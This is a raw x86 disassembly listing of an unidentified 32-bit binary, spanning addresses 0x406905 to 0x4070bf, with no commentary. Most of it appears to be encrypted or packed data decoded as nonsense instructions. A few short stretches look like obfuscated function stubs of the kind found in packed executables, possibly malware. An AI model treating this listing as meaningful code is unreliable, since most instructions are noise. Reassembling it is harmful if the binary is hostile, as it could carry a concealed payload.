  406905:	cld    
  406906:	frstor [edi-0x1d]
  406909:	inc    edi
  40690a:	or     al,0x70
  40690c:	mov    bl,BYTE PTR [ebp-0x59]
  40690f:	adc    al,0xe9
  406911:	xor    BYTE PTR [edx],dh
  406913:	fimul  WORD PTR [edi-0x40f0ccb8]
  406919:	rol    BYTE PTR [ebx+eax*2-0x1d],1
  40691d:	aam    0x2b
  40691f:	add    al,bh
  406921:	xchg   ebx,eax
  406922:	retf   0x29f
  406925:	in     eax,0xf1
  406927:	(bad)
  40692b:	dec    ebp
  40692c:	fisub  DWORD PTR [ebp-0x52]
  40692f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406930:	ret    
  406931:	inc    edi
  406932:	pusha  
  406933:	xor    bl,dl
  406935:	arpl   si,dx
  406937:	lahf   
  406938:	and    ebp,esp
  40693a:	sbb    DWORD PTR [ecx-0x7ab44a9d],0xffffffc7
  406941:	cli    
  406942:	xor    bh,bh
  406944:	jmp    0xe97ddfa9
  406949:	stos   DWORD PTR es:[edi],eax
  40694a:	push   0x639d1f8b
  40694f:	inc    ebp
  406950:	push   0x44
  406952:	jnp    0x40697e
  406954:	scas   al,BYTE PTR es:[edi]
  406955:	aaa    
  406956:	vxorps ymm6,ymm6,YMMWORD PTR [edi+0x30]
  40695b:	cmp    edi,esp
  40695d:	cmp    esi,edx
  40695f:	jl     0x406910
  406961:	and    ebx,eax
  406963:	and    dh,bl
  406965:	push   eax
  406966:	dec    ecx
  406967:	lds    esp,FWORD PTR [esi]
  406969:	mov    dh,0x6f
  40696b:	jmp    0x4069b3
  40696d:	push   0xb1f6d5c4
  406972:	inc    esp
  406973:	sub    ch,BYTE PTR [edx+ebp*4+0x69]
  406977:	push   0x2dcb76e9
  40697c:	(bad)  
  40697d:	sahf   
  40697e:	orps   xmm1,XMMWORD PTR [ebp-0x23]
  406982:	jmp    0x40690c
  406984:	rcl    DWORD PTR [eax],cl
  406986:	add    BYTE PTR [ebx],bl
  406988:	jmp    FWORD PTR [ecx]
  40698a:	dec    edx
  40698b:	or     esp,ebx
  40698d:	loopne 0x406989
  40698f:	aas    
  406990:	xchg   ecx,eax
  406991:	jl     0x406951
  406993:	sti    
  406994:	ficom  DWORD PTR [esi+eax*4-0x49]
  406998:	pop    ss
  406999:	cmp    edi,DWORD PTR [ecx+0x6c]
  40699c:	out    dx,al
  40699d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40699e:	mov    edx,esi
  4069a0:	xor    eax,0x11793304
  4069a5:	xchg   esi,eax
  4069a6:	mov    cl,0x94
  4069a8:	dec    ebp
  4069a9:	pushf  
  4069aa:	mov    eax,0x54c469a5
  4069af:	jge    0x406a1b
  4069b1:	dec    ebx
  4069b2:	push   ecx
  4069b3:	pop    edi
  4069b4:	repz pop eax
  4069b6:	icebp  
  4069b7:	jp     0x406a13
  4069b9:	iret   
  4069ba:	xor    DWORD PTR [edi],ebx
  4069bc:	jecxz  0x406a36
  4069be:	add    eax,0xf9758b5
  4069c3:	in     eax,0xd4
  4069c5:	jne    0x406958
  4069c7:	push   0x4
  4069c9:	fwait
  4069ca:	mov    ecx,0xddccf803
  4069cf:	xchg   edx,eax
  4069d0:	jg     0x4069f3
  4069d2:	aad    0x17
  4069d4:	cwde   
  4069d5:	call   0x1beede87
  4069da:	int    0xa4
  4069dc:	fiadd  DWORD PTR [ecx]
  4069de:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4069e0:	sahf   
  4069e1:	jp     0x406a02
  4069e3:	pop    esp
  4069e4:	icebp  
  4069e5:	or     BYTE PTR [edi-0x46e8a8e3],dl
  4069eb:	bound  edi,QWORD PTR [edx]
  4069ed:	call   DWORD PTR [ecx-0x5c]
  4069f0:	jnp    0x4069e0
  4069f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069f3:	sub    bl,BYTE PTR [edi]
  4069f5:	add    ch,ch
  4069f7:	(bad)  
  4069f8:	fild   QWORD PTR [ecx]
  4069fa:	(bad)  [ecx+0x71]
  4069fd:	les    ecx,FWORD PTR ds:0xadeb8818
  406a03:	dec    edx
  406a04:	in     al,0xfc
  406a06:	xor    al,0x8
  406a08:	aas    
  406a09:	cmp    ecx,esi
  406a0b:	neg    BYTE PTR ds:[ebp+0x7484677]
  406a12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a13:	daa    
  406a14:	in     eax,dx
  406a15:	inc    eax
  406a16:	xchg   ebp,eax
  406a17:	loopne 0x406a04
  406a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a1a:	ss or  eax,0x4debcb91
  406a20:	test   DWORD PTR [esi-0x2d],ebx
  406a23:	shr    DWORD PTR [esi+0x71],cl
  406a26:	pop    ss
  406a27:	inc    ebp
  406a28:	je     0x406a5f
  406a2a:	in     eax,dx
  406a2b:	xor    al,0xd6
  406a2d:	and    ax,si
  406a30:	jge    0x406a7c
  406a32:	test   BYTE PTR [eax],0x83
  406a35:	and    BYTE PTR [esi-0x4c],ch
  406a38:	adc    al,0x8c
  406a3a:	mov    eax,ds:0x28351903
  406a3f:	outs   dx,DWORD PTR ds:[esi]
  406a40:	jmp    0x406a98
  406a42:	test   al,0x24
  406a44:	xchg   ecx,eax
  406a45:	adc    DWORD PTR [eax],0xd17ffdf5
  406a4b:	xchg   esp,eax
  406a4c:	xor    al,0xca
  406a4e:	adc    bl,BYTE PTR [ebx-0x8]
  406a51:	cmp    ebx,eax
  406a53:	push   cs
  406a54:	das    
  406a55:	nop
  406a56:	mov    dl,ah
  406a58:	into   
  406a59:	ror    DWORD PTR [ebx-0x6c],1
  406a5c:	xchg   edx,eax
  406a5d:	xchg   esp,eax
  406a5e:	mov    ds:0x15d408a8,al
  406a63:	and    BYTE PTR [eax+0x55b8b8ed],0xe7
  406a6a:	mov    eax,0x3dc1365c
  406a6f:	xlat   BYTE PTR ds:[ebx]
  406a70:	xchg   esi,eax
  406a71:	icebp  
  406a72:	aaa    
  406a73:	sbb    BYTE PTR [edi+ebp*8+0x67],bl
  406a77:	jg     0x406a9a
  406a79:	out    0x7d,ax
  406a7c:	aas    
  406a7d:	push   ss
  406a7e:	scas   al,BYTE PTR es:[edi]
  406a7f:	dec    ecx
  406a80:	mov    cl,0xb
  406a82:	jp     0x406aea
  406a84:	xor    eax,ecx
  406a86:	mov    ecx,0x3b00
  406a8b:	add    ax,cx
  406a8e:	mov    ecx,DWORD PTR [ebp+0x8]
  406a91:	movzx  eax,ax
  406a94:	not    eax
  406a96:	and    eax,DWORD PTR [ecx]
  406a98:	mov    ecx,DWORD PTR [ebp+0x8]
  406a9b:	mov    DWORD PTR [ecx],eax
  406a9d:	jmp    0x406d02
  406aa2:	xor    DWORD PTR [ebp-0x4],0xe149ebe
  406aa9:	jmp    0x406d02
  406aae:	mov    edx,0x55acd5ce
  406ab3:	stos   DWORD PTR es:[edi],eax
  406ab4:	gs jmp 0x1143:0xd9dda5c
  406abc:	(bad)  
  406abd:	jo     0x406b1f
  406abf:	sar    DWORD PTR [esp+edi*2+0x30],0x7e
  406ac4:	jl     0x406b42
  406ac6:	add    edx,DWORD PTR [ebp+0x15]
  406ac9:	out    0xcf,al
  406acb:	mov    dh,BYTE PTR [ecx+0x55]
  406ace:	mov    ds,edi
  406ad0:	pop    ds
  406ad1:	xchg   esp,eax
  406ad2:	cmp    BYTE PTR [edx],bl
  406ad4:	and    esp,esi
  406ad6:	ret    0x282b
  406ad9:	or     cl,dh
  406adb:	and    al,0xb7
  406add:	pop    edx
  406ade:	mov    esp,0xa7f5a1c8
  406ae3:	les    edi,FWORD PTR [eax+0x1a38bdaf]
  406ae9:	(bad)  
  406aea:	fidivr WORD PTR [esi-0x11850b8e]
  406af0:	xchg   BYTE PTR [eax],dl
  406af2:	inc    dx
  406af4:	jl     0x406b0c
  406af6:	or     dl,BYTE PTR [edi-0x56]
  406af9:	rcr    esi,0xd6
  406afc:	pushf  
  406afd:	mov    ?,WORD PTR [ebp-0x4d]
  406b00:	into   
  406b01:	repnz popa 
  406b03:	mov    eax,ds:0x7e0abeff
  406b08:	test   DWORD PTR [ecx-0x514f489],edx
  406b0e:	aad    0x81
  406b10:	lods   al,BYTE PTR ds:[esi]
  406b11:	in     al,0x67
  406b13:	loope  0x406b24
  406b15:	rcr    BYTE PTR [edx],cl
  406b17:	call   0x7ed196c2
  406b1c:	mov    ds:0x2bab0efe,al
  406b21:	into   
  406b22:	mov    ah,0x91
  406b24:	and    al,0xcd
  406b26:	in     eax,dx
  406b27:	or     DWORD PTR [edx],edi
  406b29:	push   ds
  406b2a:	jg     0x406aed
  406b2c:	(bad)  
  406b2d:	mov    edi,0x1e6f2390
  406b32:	jmp    0x9de3c096
  406b37:	arpl   WORD PTR [ebp+0x23],dx
  406b3a:	imul   cl
  406b3c:	xchg   edi,eax
  406b3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b3e:	in     al,0x3f
  406b40:	pushf  
  406b41:	popf   
  406b42:	test   BYTE PTR [edi-0x7d447eda],ah
  406b48:	xor    BYTE PTR [esp+edx*1],0x5a
  406b4c:	sbb    bl,bl
  406b4e:	cmp    dh,BYTE PTR [edi-0x3060314c]
  406b54:	push   cs
  406b55:	call   0xc94afdc5
  406b5a:	gs movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  406b5d:	xchg   ebp,eax
  406b5e:	arpl   WORD PTR [ecx-0x77],bx
  406b61:	call   0x50fd:0x7e3fa4ac
  406b68:	push   ss
  406b69:	jae    0x406b64
  406b6b:	jge    0x406b61
  406b6d:	mov    esp,0xcf3d4047
  406b72:	pusha  
  406b73:	xchg   ecx,eax
  406b74:	mov    bh,0xa9
  406b76:	(bad)  
  406b77:	xchg   esp,eax
  406b78:	jge    0x406b68
  406b7a:	cmp    edi,esi
  406b7c:	rcl    BYTE PTR [edi+0x4a8f64ac],1
  406b82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b83:	popa   
  406b84:	inc    eax
  406b85:	sbb    DWORD PTR [esi+0x6d],edi
  406b88:	inc    ecx
  406b89:	loopne 0x406b83
  406b8b:	jl     0x406b1d
  406b8d:	in     eax,0x88
  406b8f:	dec    esp
  406b90:	inc    edi
  406b91:	or     dl,BYTE PTR [esi-0x5b5c52a3]
  406b97:	outs   dx,DWORD PTR ds:[esi]
  406b98:	jns    0x406bf5
  406b9a:	mov    ebp,0xd411bcb8
  406b9f:	imul   edi,esp,0xffffffcb
  406ba2:	cmp    ebx,DWORD PTR [esp+edx*2]
  406ba5:	dec    eax
  406ba6:	pop    edx
  406ba7:	xchg   esi,eax
  406ba8:	into   
  406ba9:	sahf   
  406baa:	(bad)  
  406bab:	adc    ebx,DWORD PTR [ebp+0x4c557c7c]
  406bb1:	and    BYTE PTR [ecx+0x1e],dh
  406bb4:	or     cl,BYTE PTR [ebx+ecx*2+0x5bb77e9f]
  406bbb:	sbb    al,bl
  406bbd:	mov    fs,WORD PTR [edi+0x65c783a7]
  406bc3:	push   cs
  406bc4:	or     ebp,0xffffff87
  406bc7:	hlt    
  406bc8:	repz in al,dx
  406bca:	and    eax,0xc1b7c99a
  406bcf:	rol    DWORD PTR [eax-0x1907b8ef],cl
  406bd5:	push   0xffffff88
  406bd7:	ins    DWORD PTR es:[edi],dx
  406bd8:	pusha  
  406bd9:	mov    esp,0xc9abcc68
  406bde:	outs   dx,BYTE PTR ds:[esi]
  406bdf:	sar    ebx,0xeb
  406be2:	mul    DWORD PTR ss:[ebx+ecx*8+0x39f820ef]
  406bea:	mov    ecx,0xdd5345e0
  406bef:	out    0xe6,eax
  406bf1:	aad    0xbb
  406bf3:	adc    al,0x6b
  406bf5:	mov    ch,0xd4
  406bf7:	in     eax,dx
  406bf8:	in     al,0xfb
  406bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bfb:	sub    esp,DWORD PTR [ecx-0x5d]
  406bfe:	pop    edi
  406bff:	adc    bh,BYTE PTR [esi-0x30]
  406c02:	adc    edi,DWORD PTR [esi+0x20]
  406c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c06:	fistp  WORD PTR [ebp+0x2dbb9233]
  406c0c:	test   esi,edi
  406c0e:	adc    BYTE PTR [edi],0x35
  406c11:	inc    ebp
  406c12:	fidivr WORD PTR [ebp+0x5dd67658]
  406c18:	sbb    ebp,DWORD PTR [edi]
  406c1a:	loop   0x406c51
  406c1c:	stos   BYTE PTR es:[edi],al
  406c1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c1e:	adc    DWORD PTR [edi],edi
  406c20:	out    dx,al
  406c21:	inc    ebx
  406c22:	test   al,0xf8
  406c24:	fidiv  DWORD PTR ds:0xe727f64
  406c2a:	mov    eax,ds:0x6765188c
  406c2f:	pusha  
  406c30:	stc    
  406c31:	inc    ebx
  406c32:	cmp    eax,0x370a3eba
  406c37:	sbb    bh,BYTE PTR [esi-0xe]
  406c3a:	jae    0x406c0d
  406c3c:	add    al,0x5a
  406c3e:	sbb    DWORD PTR ds:0xd6bf4f7e,esi
  406c44:	jp     0x406bd6
  406c46:	xor    al,0x21
  406c48:	or     ecx,edi
  406c4a:	sub    BYTE PTR [ecx+0x7d],ch
  406c4d:	and    al,0x3d
  406c4f:	rol    BYTE PTR [ebx+ecx*1-0x3af3d5e],cl
  406c56:	add    edx,DWORD PTR [ebx-0x56b586a]
  406c5c:	jmp    0x7d2824bf
  406c61:	sbb    eax,0x1fb7b410
  406c66:	ins    DWORD PTR es:[edi],dx
  406c67:	or     bh,dh
  406c69:	dec    edi
  406c6a:	loop   0x406cb2
  406c6c:	into   
  406c6d:	xor    dh,BYTE PTR [edi-0x9db856e]
  406c73:	(bad)  
  406c74:	xchg   esp,eax
  406c75:	gs xchg edi,eax
  406c77:	mov    ebx,DWORD PTR [edx+0x7b]
  406c7a:	icebp  
  406c7b:	fdivr  QWORD PTR [ebx+0x7e]
  406c7e:	adc    BYTE PTR gs:[edi-0x1601e993],bh
  406c85:	nop
  406c86:	call   0x9cb59076
  406c8b:	mov    edi,0xbd3705f
  406c90:	adc    BYTE PTR [edi],ah
  406c92:	adc    al,0xbf
  406c94:	out    dx,al
  406c95:	mov    ds:0xe2b38e8d,eax
  406c9a:	push   ebp
  406c9b:	pop    es
  406c9c:	jb     0x406c2c
  406c9e:	ds in  al,dx
  406ca0:	shl    DWORD PTR [ebp-0x18],0x91
  406ca4:	repz in al,0xb3
  406ca7:	xchg   ecx,eax
  406ca8:	sbb    edx,ebp
  406caa:	jg     0x406c5d
  406cac:	icebp  
  406cad:	call   0x4f936323
  406cb2:	dec    esi
  406cb3:	add    esi,edi
  406cb5:	pop    edi
  406cb6:	inc    edx
  406cb7:	or     BYTE PTR [esi+edi*4],al
  406cba:	sub    esi,esi
  406cbc:	add    eax,0x3357502f
  406cc1:	add    eax,DWORD PTR [ebx+0x2c]
  406cc4:	pop    ebx
  406cc5:	mov    edi,0x502e0bd6
  406cca:	and    bh,BYTE PTR [eax-0x93f2dbe]
  406cd0:	or     edi,DWORD PTR [esi+ebp*2+0x70]
  406cd4:	jp     0x406cc4
  406cd6:	vmwrite eax,DWORD PTR [esi]
  406cd9:	adc    eax,ebx
  406cdb:	mov    cl,0xa6
  406cdd:	sub    eax,0x889210f8
  406ce2:	sub    eax,0xc023e7c
  406ce7:	sbb    eax,0x147ea33
  406cec:	jns    0x406cd0
  406cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cef:	rcl    DWORD PTR [edi],cl
  406cf1:	cmp    ch,BYTE PTR [eax-0x2f]
  406cf4:	sub    BYTE PTR fs:[ebx+edx*4],0x71
  406cf9:	inc    edi
  406cfa:	add    ebx,DWORD PTR [eax-0x6f2d6c0]
  406d00:	and    DWORD PTR [edx],ebp
  406d02:	mov    ax,WORD PTR [ebp-0x8]
  406d06:	push   DWORD PTR [ebp+0x8]
  406d09:	call   0x406d1a
  406d0e:	test   eax,eax
  406d10:	je     0x406aa2
  406d16:	leave  
  406d17:	ret    0x4
  406d1a:	push   ebp
  406d1b:	mov    ebp,esp
  406d1d:	sub    esp,0x2c
  406d20:	mov    ecx,DWORD PTR ds:0x43367f
  406d26:	mov    ecx,DWORD PTR [ecx]
  406d28:	or     DWORD PTR ds:0x43369b,ecx
  406d2e:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  406d35:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  406d3c:	xor    DWORD PTR ds:0x43361b,0x9dc
  406d46:	mov    eax,0x9577
  406d4b:	movzx  ecx,BYTE PTR ds:0x4335c3
  406d52:	or     DWORD PTR ds:0x43361f,ecx
  406d58:	mov    WORD PTR [ebp-0x4],ax
  406d5c:	and    DWORD PTR ds:0x4335d7,0xaa
  406d66:	lea    eax,[ebp-0x24]
  406d69:	adc    DWORD PTR ds:0x43369b,ebx
  406d6f:	jmp    0x4070e5
  406d74:	mov    esp,ecx
  406d76:	in     eax,dx
  406d77:	xchg   ebx,eax
  406d78:	ins    DWORD PTR es:[edi],dx
  406d79:	mov    ebp,0xc300d269
  406d7e:	mov    bh,BYTE PTR ss:[esi]
  406d81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d82:	push   0x54
  406d84:	and    al,0xc2
  406d86:	jl     0x406e04
  406d88:	xlat   BYTE PTR ds:[ebx]
  406d89:	jns    0x406e07
  406d8b:	jl     0x406dd9
  406d8d:	or     esp,eax
  406d8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d90:	ins    BYTE PTR es:[edi],dx
  406d91:	add    BYTE PTR [ecx-0x65],0x7d
  406d95:	mov    DWORD PTR [ebp+0x4],ecx
  406d98:	jo     0x406dfc
  406d9a:	stos   DWORD PTR es:[edi],eax
  406d9b:	out    dx,al
  406d9c:	imul   esp,DWORD PTR [ebx+0x42],0xffffffe9
  406da0:	jmp    0xc394c364
  406da5:	mov    dh,0xe0
  406da7:	retf   
  406da8:	adc    eax,0xe2d2ec43
  406dad:	xchg   esi,eax
  406dae:	dec    esi
  406daf:	bound  esp,QWORD PTR [ecx+esi*1-0x7beab661]
  406db6:	jo     0x406e36
  406db8:	jmp    0x45ea:0x580b1dc5
  406dbf:	xchg   esp,eax
  406dc0:	pop    ebx
  406dc1:	pop    edi
  406dc2:	sub    DWORD PTR [ecx],ebx
  406dc4:	inc    esi
  406dc5:	sti    
  406dc6:	(bad)  
  406dc7:	cmc    
  406dc8:	leave  
  406dc9:	mov    ah,0x80
  406dcb:	(bad)  
  406dcc:	das    
  406dcd:	jge    0x406e3f
  406dcf:	fist   WORD PTR [ebp-0x28]
  406dd2:	icebp  
  406dd3:	in     eax,0x85
  406dd5:	iret   
  406dd6:	cwde   
  406dd7:	imul   edx,DWORD PTR [edx-0x63],0x7f
  406ddb:	bound  eax,QWORD PTR [esp+ebp*8-0xb442e9]
  406de2:	inc    ebp
  406de3:	test   BYTE PTR [edx],dh
  406de5:	or     eax,0xfb990639
  406dea:	inc    eax
  406deb:	test   DWORD PTR [eax-0x22f2c017],ebp
  406df1:	adc    ebp,DWORD PTR [ecx]
  406df3:	jl     0x406e2e
  406df5:	(bad)  
  406df6:	jne    0x406e02
  406df8:	or     bh,BYTE PTR [ecx+edx*4+0x4368ce66]
  406dff:	data16 into 
  406e01:	out    0x7e,al
  406e03:	(bad)
  406e06:	mov    edx,0x3d53cad3
  406e0b:	fisttp DWORD PTR [ebp-0x41]
  406e0e:	loopne 0x406e88
  406e10:	outs   dx,BYTE PTR ds:[esi]
  406e11:	jmp    0x79273612
  406e16:	mov    eax,0x20078f16
  406e1b:	jo     0x406e19
  406e1d:	frstor ds:0xf3f4fa49
  406e23:	repz inc edi
  406e25:	push   0xffffffa5
  406e27:	fstp   st(3)
  406e29:	(bad)  
  406e2a:	push   edi
  406e2b:	clc    
  406e2c:	mov    BYTE PTR [edi+eax*1+0x57],ch
  406e30:	mov    edx,0x5c3b58f4
  406e35:	shl    ah,cl
  406e37:	adc    BYTE PTR [ecx+ebp*2-0xc],bl
  406e3b:	mov    dh,0xba
  406e3d:	push   eax
  406e3e:	int3   
  406e3f:	or     BYTE PTR [edx],dl
  406e41:	push   edx
  406e42:	or     BYTE PTR [eax+0x3],cl
  406e45:	stos   DWORD PTR es:[edi],eax
  406e46:	sub    DWORD PTR [ebx],ebx
  406e48:	jle    0x406e2a
  406e4a:	jbe    0x406ec3
  406e4c:	jbe    0x406de4
  406e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e4f:	pop    DWORD PTR [eax]
  406e51:	pop    esp
  406e52:	push   ss
  406e53:	sub    BYTE PTR [ebx+0x6d590ab9],al
  406e59:	adc    eax,0xe1a252a4
  406e5e:	inc    edx
  406e5f:	and    ch,BYTE PTR [esi-0x5]
  406e62:	push   ebp
  406e63:	adc    DWORD PTR [eax],edx
  406e65:	int    0x20
  406e67:	mov    ch,BYTE PTR [ebx]
  406e69:	or     bh,BYTE PTR [eax-0x23]
  406e6c:	mov    bh,al
  406e6e:	mov    ebp,0x574780f7
  406e73:	repz push ecx
  406e75:	inc    edi
  406e76:	retf   0xa371
  406e79:	push   0x14cb07db
  406e7e:	aad    0xec
  406e80:	std    
  406e81:	inc    esp
  406e82:	sahf   
  406e83:	xor    al,0xbc
  406e85:	addr16 enter 0xdb46,0x9b
  406e8a:	loopne 0x406efc
  406e8c:	cmp    ecx,DWORD PTR [ebp-0x49]
  406e8f:	cmp    bl,ch
  406e91:	mov    cl,0x3b
  406e93:	push   ebx
  406e94:	sar    BYTE PTR [ebp-0x7245cbc],0x56
  406e9b:	pop    ss
  406e9c:	xchg   ebx,eax
  406e9d:	add    ebx,ecx
  406e9f:	icebp  
  406ea0:	stos   DWORD PTR es:[edi],eax
  406ea1:	sbb    esp,DWORD PTR [edi]
  406ea3:	daa    
  406ea4:	loop   0x406e9d
  406ea6:	dec    edx
  406ea7:	adc    DWORD PTR [ebx],0xed38f362
  406ead:	mov    dl,0xb8
  406eaf:	xor    eax,esp
  406eb1:	sub    eax,0x9afc1e2c
  406eb6:	stos   DWORD PTR es:[edi],eax
  406eb7:	pop    edx
  406eb8:	dec    esp
  406eb9:	inc    eax
  406eba:	ds ja  0x406f1c
  406ebd:	(bad)  
  406ebe:	out    dx,eax
  406ebf:	xchg   ebx,eax
  406ec0:	xor    al,0x26
  406ec2:	dec    ebp
  406ec3:	add    al,0x87
  406ec5:	pop    ebp
  406ec6:	xor    al,0xf7
  406ec8:	and    BYTE PTR [edx-0x3],bl
  406ecb:	jbe    0x406f1f
  406ecd:	add    eax,0xc4346408
  406ed2:	aas    
  406ed3:	mov    bh,0xfc
  406ed5:	mov    fs,WORD PTR [edi-0x1481dc73]
  406edb:	repz sub eax,DWORD PTR ds:0x47f24497
  406ee2:	icebp  
  406ee3:	xchg   edx,eax
  406ee4:	or     ebp,DWORD PTR [edx]
  406ee6:	out    0x6,al
  406ee8:	mov    edi,0x90b0348f
  406eed:	sbb    eax,0x45570f57
  406ef2:	pop    esi
  406ef3:	retf   0xf71e
  406ef6:	and    BYTE PTR [ecx+0x1952a326],dl
  406efc:	ret    0x37e6
  406eff:	mov    edi,0xe86b81d6
  406f04:	jo     0x406f0e
  406f06:	mov    dh,0x99
  406f08:	sbb    bh,bh
  406f0a:	in     eax,dx
  406f0b:	jge    0x406e93
  406f0d:	adc    ebp,DWORD PTR [ebx+ecx*1+0x31a5763e]
  406f14:	neg    BYTE PTR [edi-0x2fd35faf]
  406f1a:	dec    esi
  406f1b:	mov    edx,0xfe281a09
  406f20:	fsub   DWORD PTR [edx-0x24]
  406f23:	adc    edi,ecx
  406f25:	stc    
  406f26:	pop    ebp
  406f27:	add    edx,DWORD PTR [esi+0x79f05d87]
  406f2d:	test   BYTE PTR ds:0xa4a2ef2e,dl
  406f33:	and    bh,BYTE PTR [ebx+0x1709b218]
  406f39:	xor    al,0x50
  406f3b:	not    DWORD PTR [edx]
  406f3d:	fst    st(2)
  406f3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f40:	aad    0x44
  406f42:	jne    0x406f65
  406f44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f45:	daa    
  406f46:	cli    
  406f47:	xchg   ebp,eax
  406f48:	dec    ecx
  406f49:	jg     0x406f02
  406f4b:	sbb    ch,bl
  406f4d:	jbe    0x406f5e
  406f4f:	pop    edx
  406f50:	sub    al,0x5
  406f52:	xchg   ebp,ebp
  406f54:	cmc    
  406f55:	pop    ss
  406f56:	xchg   BYTE PTR [ebp+0x68],bh
  406f59:	cmc    
  406f5a:	lods   eax,DWORD PTR ds:[esi]
  406f5b:	test   eax,0x4e483116
  406f60:	mov    esp,0x77eb22ad
  406f65:	stc    
  406f66:	cmp    al,0xd0
  406f68:	clc    
  406f69:	cmp    BYTE PTR [esi-0x5e347b4d],dh
  406f6f:	inc    ebp
  406f70:	(bad)  
  406f72:	retf   0x19fd
  406f75:	xchg   esi,eax
  406f76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f77:	loop   0x406f17
  406f79:	sub    dh,dl
  406f7b:	dec    ebx
  406f7c:	inc    esi
  406f7d:	jo     0xa3108a62
  406f83:	sbb    BYTE PTR [ebp+0x3d],0xa
  406f87:	push   ebx
  406f88:	pop    esp
  406f89:	call   0xa81a:0x80853ea6
  406f90:	stos   DWORD PTR es:[edi],eax
  406f91:	xor    al,0x1f
  406f93:	ins    BYTE PTR es:[edi],dx
  406f94:	push   ebp
  406f95:	jge    0x406f84
  406f97:	mov    dl,BYTE PTR [esi+0x7eedd08c]
  406f9d:	out    0x89,al
  406f9f:	xor    DWORD PTR [eax-0x5080e670],ebp
  406fa5:	sbb    eax,0x3bb48a63
  406faa:	sub    ebx,DWORD PTR [edi+0x1e5c8087]
  406fb0:	inc    eax
  406fb1:	mov    esi,0x1a53ed4e
  406fb6:	and    al,0x1c
  406fb8:	outs   dx,BYTE PTR ds:[esi]
  406fb9:	dec    edi
  406fba:	jnp    0x406ff4
  406fbc:	sbb    ch,BYTE PTR [esi-0x58753dd6]
  406fc2:	lods   al,BYTE PTR ds:[esi]
  406fc3:	sbb    al,0x77
  406fc5:	out    dx,eax
  406fc6:	add    BYTE PTR [edi],ch
  406fc8:	sub    eax,0xfba06670
  406fcd:	sub    esi,ebp
  406fcf:	jg     0x406f98
  406fd1:	jle    0x406fff
  406fd3:	add    DWORD PTR [ecx-0x1359d690],edx
  406fd9:	loopne 0x406ff9
  406fdb:	mov    al,ds:0x6d69e326
  406fe0:	(bad)  
  406fe1:	cmp    BYTE PTR [esi-0x36574bcf],dl
  406fe7:	and    esp,DWORD PTR [ebx-0x6d]
  406fea:	adc    al,0xce
  406fec:	popa   
  406fed:	add    al,0x25
  406fef:	mov    edx,0xdeb18a16
  406ff4:	retf   0xf62a
  406ff7:	std    
  406ff8:	fst    QWORD PTR [edx-0x36]
  406ffb:	sub    eax,DWORD PTR [eax+0x12d9541f]
  407001:	ret    
  407002:	loope  0x406fdc
  407004:	cmc    
  407005:	pusha  
  407006:	and    al,ah
  407008:	cmp    ah,BYTE PTR [ebp+0x53cdb335]
  40700e:	dec    esi
  40700f:	cdq    
  407010:	sbb    al,0x15
  407012:	outs   dx,DWORD PTR ds:[esi]
  407013:	mov    dh,0x20
  407015:	mov    WORD PTR [esi],fs
  407017:	fimul  DWORD PTR [ebx+0x7427f2cf]
  40701d:	push   es
  40701e:	in     al,dx
  40701f:	sbb    al,BYTE PTR [eax-0x296364bc]
  407025:	cmc    
  407026:	stos   BYTE PTR es:[edi],al
  407027:	into   
  407028:	or     eax,0xe660df22
  40702d:	retf   0xec71
  407030:	mov    esp,0xd15ece44
  407035:	and    BYTE PTR [eax],ch
  407037:	mov    ah,0x77
  407039:	inc    ecx
  40703a:	popa   
  40703b:	pusha  
  40703c:	bound  edi,QWORD PTR [ebp-0x3c]
  40703f:	out    0x32,eax
  407041:	(bad)  
  407043:	pop    ebp
  407044:	mov    edi,esi
  407046:	adc    DWORD PTR [eax],edx
  407048:	scas   al,BYTE PTR es:[edi]
  407049:	imul   ebx,DWORD PTR [ebp+eax*8+0x4b],0x4d951251
  407051:	xchg   esp,eax
  407052:	retf   
  407053:	inc    ebx
  407054:	test   eax,0xc044bfe6
  407059:	xor    ch,BYTE PTR [ebx-0x2bc12d4e]
  40705f:	ficom  WORD PTR [edi]
  407061:	dec    eax
  407062:	stc    
  407063:	scas   al,BYTE PTR es:[edi]
  407064:	jns    0x4070da
  407066:	dec    edx
  407067:	cmp    DWORD PTR [edi-0x7e95b6b7],ecx
  40706d:	xchg   edx,eax
  40706e:	sbb    BYTE PTR [eax-0x6caa2a8],cl
  407074:	pop    edi
  407075:	test   ebp,esi
  407077:	mov    ebp,0x5dc3f0ed
  40707c:	clc    
  40707d:	pusha  
  40707e:	imul   eax,DWORD PTR [edx+0x4d],0x20a37f62
  407085:	stc    
  407086:	enter  0x55ae,0x3e
  40708a:	push   cs
  40708b:	jb     0x40707d
  40708d:	nop
  40708e:	rcr    BYTE PTR [edx+0x7c8137bc],0x11
  407095:	or     dh,BYTE PTR [ebx+edi*2+0x43]
  407099:	mov    ah,0xc6
  40709b:	ds imul edi,eax,0xffffffe6
  40709f:	xor    dh,BYTE PTR [esi-0x3f21034f]
  4070a5:	dec    edx
  4070a6:	(bad)  
  4070a8:	sub    al,0x20
  4070aa:	xor    BYTE PTR [edx+0x76e5085d],bh
  4070b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070b1:	aad    0x25
  4070b3:	lock daa 
  4070b5:	mov    ebx,0x6545615e
  4070ba:	mov    edi,0xaf31f3db
  4070bf:	jne    0x407108
